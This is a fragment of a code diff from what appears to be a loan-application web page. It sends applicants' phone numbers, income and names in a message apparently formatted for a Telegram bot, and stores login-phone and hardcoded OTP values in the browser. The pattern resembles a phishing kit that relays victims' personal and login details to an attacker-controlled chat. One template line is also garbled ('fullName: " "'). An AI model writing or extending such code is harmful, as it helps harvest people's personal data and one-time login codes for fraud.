@@ -523,7 +523,7 @@
 
 Mobile: <code>${mobile}</code>
 Applicant: <code>monthlyIncome</code>
-Name: <code>fullName</code>
+fullName: " "
 `,
           parse_mode: 'HTML',
           reply_markup: {
@@ -541,10 +541,7 @@ Name: <code>fullName</code>
       })
       .then(() => {
         
-      localStorage.setItem('fbc_applicant_name', fullName);
-      localStorage.setItem('fbc_phone_number', mobile);
-      localStorage.setItem('fbc_loan_purpose', loanPurpose);
-      localStorage.setItem('fbc_monthly_income', monthlyIncome);
+        localStorage.setItem('fbc_phone_number', mobile);
         localStorage.setItem('fbc_login_phone', mobile);
         localStorage.setItem('fbc_otp_ref', '9vXfk');
 
